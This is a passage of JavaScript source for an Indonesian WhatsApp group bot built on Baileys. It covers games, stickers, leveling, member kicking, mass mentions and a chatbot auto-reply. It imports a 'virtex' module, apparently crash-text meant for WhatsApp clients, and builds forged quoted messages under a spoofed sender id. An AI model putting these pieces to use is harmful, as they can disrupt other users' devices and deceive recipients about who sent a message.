const {
    WAConnection,
	MessageType,
	Presence,
	MessageOptions,
	Mimetype,
	WALocationMessage,
	WA_MESSAGE_STUB_TYPES,
	WA_DEFAULT_EPHEMERAL,
	ReconnectMode,
	ProxyAgent,
	ChatModification,
	GroupSettingChange,
	waChatKey,
	mentionedJid,
	processTime,
	Browsers,
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone")
const speed = require('performance-now')
const { spawn, exec, execSync } = require("child_process")
const ffmpeg = require('fluent-ffmpeg')
const twitterGetUrl = require("twitter-url-direct")
const googleImage = require('g-i-s')
const brainly = require('brainly-scraper')
const fetch = require('node-fetch');
const request = require('request');
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const axios = require("axios")
const fs = require("fs-extra")
const util = require('util')
const got = require("got");
const qrcodes = require('qrcode');
const crypto = require('crypto')
const imgbb = require('imgbb-uploader');
const os = require('os');
const neko = require('nekobocc');
const { virtex, vipi } = require('./lib/virtex.js')
const Mfake = fs.readFileSync ('./media/ganteng.jpg')
const Mthumb = fs.readFileSync('./media/ganteng.jpg')
const timeWib = moment.tz('Asia/Jakarta').format('DD/MM')
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const { help, bahasa, donasi, limitcount, bottt, listsurah } = require('./lib/help')
const hx = require('./lib/downloadig2.js');
const ig = require("./lib/index.js");
const nekop = require('./lib/nekopoi.js');
const scrap = require('./lib/scrapper.js');
const todapi = require("./lib/testapi.js");
const { recognize } = require('./lib/ocr')
const { fbdl } = require("./lib/fbdl");
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
		
// stickwm
const Exif = require('./lib/exif');
const exif = new Exif();

const { downloadMenu, infoMenu, gameMenu, groupMenu, funMenu, wibuMenu, ownerMenu, stickerMenu, otherMenu, rulesBot, islamMenu, sertiMenu, ceritaMenu, makerMenu,dewasaMenu, toolsMenu} = require('./message/help.js')
const { getBuffer, getGroupAdmins, getRandom, runtime, sleep } = require('./lib/myfunc')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetch')
const { color, bgcolor } = require('./lib/color')
const { mess } = require('./message/mess')
const { Toxic } = require('./lib/Toxic.js')
const { cmdadd } = require('./lib/totalcmd.js')
const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('./lib/uploadimage')
const { onGoing, dadu, asupan } = require("./lib/otakudesu.js")
const { mediafireDl } = require('./lib/mediafire.js')
const { wikiSearch } = require('./lib/wiki.js')
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js")
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { ythd } = require('./lib/ytdl')
const afk = require("./lib/afk");
const level = require("./lib/level");
const atm = require("./lib/atm");
const reminder = require("./lib/reminder")
const { pShadow,
  pRomantic,
  pSmoke,
  pBurnPapper,
  pNaruto,
  pLoveMsg,
  pMsgGrass,
  pGlitch,
  pDoubleHeart,
  pCoffeCup,
  pLoveText,
  pButterfly } = require('./lib/photooxy')

autorespon = false
var kuis = false
antidel = false
hit_today = []
ky_ttt = []
blocked = []
const setGelud = require('./lib/gameGelud.js')
const game = require("./lib/game");
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]

//******************** 》Game《 ********************\\
let tebakanime = JSON.parse(fs.readFileSync('./database/tebakanime.json'))
let tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
let asahotak = JSON.parse(fs.readFileSync('./database/asahotak.json'))
let caklontong = JSON.parse(fs.readFileSync('./database/caklontong.json'))
let tebaksiapaaku = JSON.parse(fs.readFileSync('./database/tebaksiapaaku.json'))
let tebakbendera = JSON.parse(fs.readFileSync('./database/tebakbendera.json'))
let susunkata = JSON.parse(fs.readFileSync('./database/susunkata.json'))
let tebakata = JSON.parse(fs.readFileSync('./database/tebakata.json'))
let tebaklirik = JSON.parse(fs.readFileSync('./database/tebaklirik.json'))
let tebakjenaka = JSON.parse(fs.readFileSync('./database/tebakjenaka.json'))
let tebakimia = JSON.parse(fs.readFileSync('./database/tebakimia.json'))
let kuismath = JSON.parse(fs.readFileSync('./database/kuismath.json'))
let antiviewonce = JSON.parse(fs.readFileSync('./database/group/antiviewonce.json'));
const antitelegram = JSON.parse(fs.readFileSync('./database/antitelegram.json'))
const antilinkig = JSON.parse(fs.readFileSync('./database/antilinkig.json'))
const antilinkfb = JSON.parse(fs.readFileSync('./database/antilinkfb.json'))
const antilinkytv = JSON.parse(fs.readFileSync('./database/antilinkyt.json'))
const antilinkytc = JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
let tebaklagu = JSON.parse(fs.readFileSync('./database/tebaklagu.json'))
let tebaktebakan = JSON.parse(fs.readFileSync('./database/tebaktebakan.json'))
let family100 = [];

let setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
let imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
let videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
let audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
let fakeimage = fs.readFileSync("./media/ganteng.jpg")
let errorImg = 'https://i.ibb.co/FBm52Pt/1e0fe6a08b67.jpg'
let setting = JSON.parse(fs.readFileSync('./setting.json'))
let {    
    gamewaktu,
} = require('./setting.json')

owner = setting.owner
gamewaktu = setting.gamewaktu
limitt = setting.limitt
petik = '```'
fake = 'CREATOR BOT\Rimuru'//GANTI NAMA KAMU BEP

// Database
const _registered = JSON.parse(fs.readFileSync('./database/registered.json'))
let register = JSON.parse(fs.readFileSync('./database/registered.json'))
const muted = JSON.parse(fs.readFileSync('./database/group/mute.json'))
let welkom = JSON.parse(fs.readFileSync('./database/group/welcome.json'))
const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
let _afk = JSON.parse(fs.readFileSync('./database/user/afk.json'));
let _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))
let _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
let _uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
let glimit = JSON.parse(fs.readFileSync('./database/user/glimit.json'));
let antilink = JSON.parse(fs.readFileSync('./database/group/antilink.json'));
let mute = JSON.parse(fs.readFileSync('./database/group/mute.json'));
const antivirtex = JSON.parse(
      fs.readFileSync("./database/antivirtex.json")
    );
    const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
    
    const antihidetg = JSON.parse(
      fs.readFileSync("./database/antihidetag.json")
    );
let _update = JSON.parse(fs.readFileSync('./database/bot/update.json'))
let _scommand = JSON.parse(fs.readFileSync('./database/bot/scommand.json'))
const _reminder = JSON.parse(fs.readFileSync("./database/reminder.json"));
const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
const _limit = JSON.parse(fs.readFileSync('./database/limit.json'))


const getPremiumExpired = (sender) => {

		    let position = null
		    Object.keys(prem).forEach((i) => {
		        if (prem[i].id === sender) {
		            position = i
		        }
		    })
		    if (position !== null) {
		        return prem[position].expired
		    }
		} 
		
		const expiredCheck = () => {
		    setInterval(() => {
		        let position = null
		        Object.keys(prem).forEach((i) => {
		            if (Date.now() >= prem[i].expired) {
		                position = i
		            }
		        })
		        if (position !== null) {
		            console.log(`Premium expired: ${prem[position].id}`)
		            prem.splice(position, 1)
		            fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
		             }
		    }, 1000)
		} 
		
		const getAllPremiumUser = () => {
		    const array = []
		    Object.keys(prem).forEach((i) => {
		        array.push(prem[i].id)
		    })
		    return array
		}
		var ase = new Date();
                        var jamss = ase.getHours();
                         switch(jamss){
                case 0: jamss = "Midnight 🌚"; break;
                case 1: jamss = "Midnight 🌚"; break;
                case 2: jamss = "Midnight 🌚"; break;
                case 3: jamss = "Midnight 🌔"; break;
                case 4: jamss = "Midnight 🌔"; break;
                case 5: jamss = "Dawn 🌄"; break;
                case 6: jamss = "Morning 🌄"; break;
                case 7: jamss = "Morning 🌄"; break;
                case 8: jamss = "Morning ☀️"; break;
                case 9: jamss = "Morning ☀️"; break;
                case 10: jamss = "Morning ☀️"; break;
                case 11: jamss = "Afternoon 🌞"; break;
                case 12: jamss = "Zuhur 🌞"; break;
                case 13: jamss = "Afternoon 🌞"; break;
                case 14: jamss = "Afternoon 🌞"; break;
                case 15: jamss = "Asr 🌞"; break;
                case 16: jamss = "Afternoon ☀️"; break;
                case 17: jamss = "Evening 🌄"; break;
                case 18: jamss = "Maghrib 🌄"; break;
                case 19: jamss = "Isha 🌙"; break;
                case 20: jamss = "Night 🌙"; break;
                case 21: jamss = "Night 🌙"; break;
                case 22: jamss = "Midnight 🌙"; break;
                case 23: jamss = "Midnight 🌚"; break;
            }
            var tampilUcapan = "" + jamss;


//Limit1
const limitAdd = (sender) => {
		let position = false
		Object.keys(_limit).forEach((i) => {
		if (_limit[i].id == sender) {
		position = i 
		}
	}
)
		if (position !== false) {
		_limit[position].limit += 1
		fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
		}
	} 

// Sticker Cmd
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}


module.exports = dha = async (dha, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		if (mek.key.id.startsWith('3EB0') && mek.key.id.length === 12) return
		global.ky_ttt
		global.blocked
		mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const type = Object.keys(mek.message)[0]        
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        const prefix = /^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™= |~#%^&.?/\\©^z+*,;]/gi) : '!'
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message[type].fileSha256.toString('base64')) !== null && getCmd(mek.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message[type].fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		hit_today.push(command)
		const arg = body.substring(body.indexOf(' ') + 1)
		const ar = args.map((v) => v.toLowerCase())
		const argz = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix) 
		if (isCmd) cmdadd()
		const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd
        const q = args.join(' ')

        const botNumber = dha.user.jid
        const ownerNumber = setting.ownerNumber
		const ownerName = setting.ownerName
		const botName = setting.botName
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		let senderr = mek.key.fromMe ? dha.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
		const senderNumber = sender.split("@")[0]  
		const totalchat = await dha.chats.all()
		const groupMetadata = isGroup ? await dha.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const conts = mek.key.fromMe ? dha.user.jid : dha.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? dha.user.name : conts.notify || conts.vname || conts.name || '-'
        const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByreply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByreply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
		idttt = []
	    players1 = []
	    players2 = []
	    gilir = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    players1.push(t.player1)
	    players2.push(t.player2)
	    gilir.push(t.gilir)
}
	    const isTTT = isGroup ? idttt.includes(from) : false
	    isPlayer1 = isGroup ? players1.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false
        const isOwner = ownerNumber.includes(senderr)
        const isAfkOn = afk.checkAfkUser(sender, _afk)
        const isLevelingOn = isGroup ? _leveling.includes(from) : false
        const isMuted = isGroup ? muted.includes(from) : false
        const isWelkom = isGroup ? welkom.includes(from) : true
        const isAntiviewonce = isGroup ? antivo.includes(from) : false;
        const isAntiLinkTelegram = isGroup ? antitelegram.includes(from) : false
			const isAntiLinkig = isGroup ? antilinkig.includes(from) : false
            const isAntiLinkfb = isGroup ? antilinkfb.includes(from) : false
			const isAntiLinkytc = isGroup ? antilinkytc.includes(from) : false
            const isAntiLinkytv = isGroup ? antilinkytv.includes(from) : false
        const isBanned = ban.includes(sender)
        const isPremium= prem.includes(sender)
        
        //But verify
const getRegisteredRandomId = () => {
return _registered[Math.floor(Math.random() * _registered.length)].id
}
const addRegisteredUser = (userid, sender, age, time, serials) => {
const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
_registered.push(obj)
fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
}
const checkRegisteredUser = (sender) => {
let status = false
Object.keys(_registered).forEach((i) => {
if (_registered[i].id === sender) {
status = true
}
})
return status
}

const isRegistered = checkRegisteredUser(sender)

const sendButRegis = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
};
dha.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
);
};

const daftar1 = `Hai kak  ${pushname} ${tampilUcapan} \n\nSebelum Mengakses Bot Verify Terlebih Dahulu Ya `
const daftar2 = '```Ketik Tombol Di Bawah Untuk Verify Kak```'
const daftar3 = [{buttonId: `${prefix}verify`,buttonText: {displayText: `🗿DAFTAR🗿 `,},type: 1,},]

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
        
        const sticOwner = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/owner.webp')
			dha.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticNotAdmin = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/notadmin.webp')
			dha.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticAdmin = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/admin.webp')
			dha.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticWait = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/wait.webp')
			dha.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticOk = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/ok.webp')
			dha.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
        
        /// Anti
dha.on('CB:Blocklist', json => {
		if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})
dha.on('CB:action,,call', async json => {
    const callerId = json[2][0][1].from;
    console.log("call dari "+ callerId)
        ban.push(callerId)
        dha.sendMessage(callerId, "Telpon = Block \nAnda di block Karna Telpon Bot \nSilahkan Chat ownerku untuk membuka block!\nwa.me/+6288804010677", MessageType.text)
        await sleep(5000)
        blocked.push(callerId)
        await dha.blockUser(callerId, "add") // Block user
})
        
        
        // here button function
        selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''

        responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''

        const gcount = setting.gcount
        
        const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
            let po = dha.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Pilih Disini","footerText": "SEMOGA DAPAT MEMBANTU","listType": "SINGLE_SELECT","sections": list}}, {})
            return dha.relayWAMessage(po, {waitForAck: true})
        }
        
        const isUrl = (url) => {
            return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
        }
        function monospace(string) {
            return '```' + string + '```'
        }   
        function jsonformat(string) {
            return JSON.stringify(string, null, 2)
        }
        function randomNomor(angka){
            return Math.floor(Math.random() * angka) + 1
        }
        const reply = (teks) => {
	      dha.sendMessage(from, teks, text, {quoted:mek, thumbnail: fakeimage})
        }
        const sendMess = (hehe, teks) => {
           dha.sendMessage(hehe, teks, text)
        }
        const mentions = (teks, memberr, id) => {
           (id == null || id == undefined || id == false) ? dha.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/ganteng.jpg')}, extendedText, { sendEphemeral: true, contextInfo: { "mentionedJid": memberr } }) : dha.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/ganteng.jpg')}, extendedText, { sendEphemeral: true, quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }
        const sendText = (from, text) => {
           dha.sendMessage(from, text, MessageType.text)
        }
        const textImg = (teks) => {
           return dha.sendMessage(from, teks, text, {quoted: mek, thumbnail: fs.readFileSync('./media/ganteng.jpg')})
        }
        const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./media/ganteng.jpg')
        }}}
       const math = (teks) => {
           return Math.floor(teks)
       }
       const kick = function(from, orangnya){
	       for (let i of orangnya){
	       dha.groupRemove(from, [i])
        }
        }

       const kickMember = async(id, target = []) => {
           let group = await dha.groupMetadata(id)
           let owner = group.owner.replace("c.us", "s.whatsapp.net")
           let me = dha.user.jid
           for (i of target) {
           if (!i.includes(me) && !i.includes(owner)) {
           await dha.groupRemove(to, [i])
        } else {
           await dha.sendMessage(id, "Not Premited!", "conversation")
           await limitAdd(sender)
break
        }
    }
}
       const add = function(from, orangnya){
	       dha.groupAdd(from, orangnya)
}
       const sendKontak = (from, nomor, nama, org = "") => {
	       const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	       dha.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, {quoted: mek})
}
      const hideTag = async function(from, text){
	       let anu = await dha.groupMetadata(from)
	       let members = anu.participants
	       let ane = []
	       for (let i of members){
	       ane.push(i.jid)
}
	       dha.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('media/ganteng.jpg')}, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
}  
      const sendWebp = async(to, url) => {
           var names = Date.now() / 10000;
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, './sticker' + names + '.png', async function () {
           console.log('selesai');
           let filess = './sticker' + names + '.png'
           let asw = './sticker' + names + '.webp'
           exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`, (err) => {
           fs.unlinkSync(filess)
           if (err) return reply(`${err}`)
           exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
           if (error) return reply(`${error}`)
           dha.sendMessage(from, fs.readFileSync(asw), sticker, {sendEphemeral:true, quoted:mek})
           fs.unlinkSync(asw)
});
});
});
}
       const sendMediaURL = async(to, url, text="", mids=[]) =>{
           if(mids.length > 0){
           text = normalizeMention(to, text, mids)
}
           const fn = Date.now() / 10000;
           const filename = fn.toString()
           let mime = ""
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           mime = res.headers['content-type']
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, filename, async function () {
           console.log('done');
           let media = fs.readFileSync(filename)
           let type = mime.split("/")[0]+"Message"
           if(mime === "image/gif"){
           type = MessageType.video
           mime = Mimetype.gif
}
           if(mime.split("/")[0] === "audio"){
           mime = Mimetype.mp4Audio
}
           dha.sendMessage(to, media, type, {quoted: mek, mimetype: mime, caption: text, thumbnail: Buffer.alloc(0), contextInfo: {"mentionedJid": mids}})
                     
           fs.unlinkSync(filename)
});
}
      const sendFileFromUrl = async(link, type, options) => {
           hasil = await getBuffer(link)
	       dha.sendMessage(from, hasil, type, options).catch(e => {
	       fetch(link).then((hasil) => {
	       dha.sendMessage(from, hasil, type, options).catch(e => {
	       dha.sendMessage(from, { url : link }, type, options).catch(e => {
	       reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	       console.log(e)
})
})
})
})
}
const promoteAdmin = async function(to, target=[]){
           if(!target.length > 0) { return  reply("No target..") }
           let g = await dha.groupMetadata(to)
           let owner = g.owner.replace("c.us","s.whatsapp.net")
           let me = dha.user.jid
           for (i of target){
           if (!i.includes(me) && !i.includes(owner)){
           const res = await dha.groupMakeAdmin(to, [i])
           reply(`Hm..... @${mentioned[0].split('@')[0]} JABATANMU DINAIKAN AKU BANGGA PADAMU`)
}
}
}
      const demoteAdmin = async function(to, target=[]){
           if(!target.length > 0) { return  reply("No target..") }
           let g = await dha.groupMetadata(to)
           let owner = g.owner.replace("c.us","s.whatsapp.net")
           let me = dha.user.jid
           for (i of target){
           if (!i.includes(me) && !i.includes(owner)){
           const res = await dha.groupDemoteAdmin(to, [i])
           reply(`Hm..... @${mentioned[0].split('@')[0]} JABATANMU TURUNKAN SAYA IKUT SEDIH`)
				
}
}
}
          let authorname = dha.contacts[from] != undefined ? dha.contacts[from].vname || dha.contacts[from].notify : undefined	
          if (authorname != undefined) { } else { authorname = groupName }	
          function addMetadata(packname, author) {	
          if (!packname) packname = 'WABot'; if (!author) author = 'Bot';author = author.replace(/[^a-zA-Z0-9]/g, '');	
          let name = `${author}_${packname}`
          if (fs.existsSync(`./sticker/${name}.exif`)) return `./sticker/${name}.exif`
          const json = {	
         "sticker-pack-name": packname,
         "sticker-pack-publisher": author,
}
         const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
         const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
         let len = JSON.stringify(json).length	
         let last	
         if (len > 256) {	
         len = len - 256	
         bytes.unshift(0x01)	
         } else {	
         bytes.unshift(0x00)	
}	
         if (len < 16) {	
         last = len.toString(16)	
         last = "0" + len	
         } else {	
         last = len.toString(16)	
}	
       const buf2 = Buffer.from(last, "hex")	
	   const buf3 = Buffer.from(bytes)	
	   const buf4 = Buffer.from(JSON.stringify(json))	
	   const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	
	   fs.writeFile(`./sticker/${name}.exif`, buffer, (err) => {	
	   return `./sticker/${name}.exif`	
})	
}


     const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'Selamat Malam🌃'
}
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'Selamat Petang🌆'
}
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'Selamat Sore🌇'
}
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'Selamat Siang🏙️'
}
        if(time2 < "11:00:00"){
        var ucapanWaktu = 'Selamat Pagi🌅'
}
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'Selamat Malam🌃'
}
         const levelRole = level.getLevelingLevel(sender, _level)
        var role = 'Warrior III'
        if (levelRole <= 5) {
            role = 'Warrior II'
        } else if (levelRole <= 10) {
            role = 'Warrior I'
        } else if (levelRole <= 15) {
            role = 'Elite III'
        } else if (levelRole <= 20) {
            role = 'Elite II'
        } else if (levelRole <= 25) {
            role = 'Elite I'
        } else if (levelRole <= 30) {
            role = 'Master III'
        } else if (levelRole <= 35) {
            role = 'Master II'
        } else if (levelRole <= 40) {
            role = 'Master I'
        } else if (levelRole <= 45) {
            role = 'GrandMaster III'
        } else if (levelRole <= 50) {
            role = 'GrandMaster II'
        } else if (levelRole <= 55) {
            role = 'GrandMaster I'
        } else if (levelRole <= 60) {
            role = 'Epic III'
        } else if (levelRole <= 65) {
            role = 'Epic II'
        } else if (levelRole <= 70) {
            role = 'Epic I'
        } else if (levelRole <= 75) {
            role = 'Legend III'
        } else if (levelRole <= 80) {
            role = 'Legend II'
        } else if (levelRole <= 85) {
            role = 'Legend I'
        } else if (levelRole <= 90) {
            role = 'Mythic'
        } else if (levelRole <= 95) {
            role = 'Mythical Glory'
        } else if (levelRole >= 100) {
            role = 'Immortal'
        } 
        
        const santet = [
            'Muntah Paku',
            'Meninggoy',
            'Berak Paku',
            'Muntah Rambut',
            'Ketempelan MONYET!!!',
            'Berak di Celana Terus',
            'Menjadi Gila',
            'Menjadi manusiawi',
            'jomblo selamanya',
            'ga bisa berak',
            'ketiban pesawat',
            'jadi anak mulung',
            'ga jadi pacar zeus',
            'jadi jelek'
        ]

        const kutuk = [
            'Sapi',
            'Batu',
            'Babi',
            'Anak soleh dan soleha',
            'pohon pisang',
            'janda',
            'bangsat',
            'buaya',
            'Jangkrik',
            'Kambbiingg',
            'Bajing',
            'kang seblak',
            'kang gorengan',
            'kang siomay',
            'badut ancol',
            'Tai',
            'Kebo',
            'Badak biar Asli',
            'tai kotok',
            'Bwebwek',
            'Orang Suksesss...... tapi boong',
            'Beban Keluarga' //tambahin  aja
        ]
        
		pporang = 'httpsl://telegra.ph/file/58f6d9179e497062a84b0.jpg'
		      
		const ofrply = await getBuffer(pporang)
        if (!isGroup && !isCmd && !command && !mek.key.fromMe && !autorespon) {
	simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
                     sami = simi.success
                        dha.sendMessage(from, `${sami}`, text, {thumbnail: ofrply, sendEphemeral: true, quoted:mek, contextInfo : {forwardingScore: 508, isForwarded: true}})
                      }
       // FUNCTION LEVELING
       if (isGroup && !mek.key.fromMe && !level.isGained(sender) && isLevelingOn) {
       try {
       level.addCooldown(sender)
       const checkATM = atm.checkATMuser(sender, _uang)
       if (checkATM === undefined) atm.addATM(sender, _uang)
       const uangsaku = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       atm.addKoinUser(sender, uangsaku, _uang)
       const currentLevel = level.getLevelingLevel(sender, _level)
       const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       const requiredXp = 10 * Math.pow(currentLevel, 2) + 50 * currentLevel + 100
       level.addLevelingXp(sender, amountXp, _level)
       if (requiredXp <= level.getLevelingXp(sender, _level)) {
       level.addLevelingLevel(sender, 1, _level)
       const userLevel = level.getLevelingLevel(sender, _level)
       const fetchXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
       reply(`*「 LEVEL UP 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${level.getLevelingXp(sender, _level)} / ${fetchXp}\n➸ *Level :* ${currentLevel} -> ${level.getLevelingLevel(sender, _level)} 🆙 \n➸ *Role*: *${role}*\n\nCongrats!! 🎉🎉`)
} 
       } catch (err) {
       console.error(err)
}
}
        colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
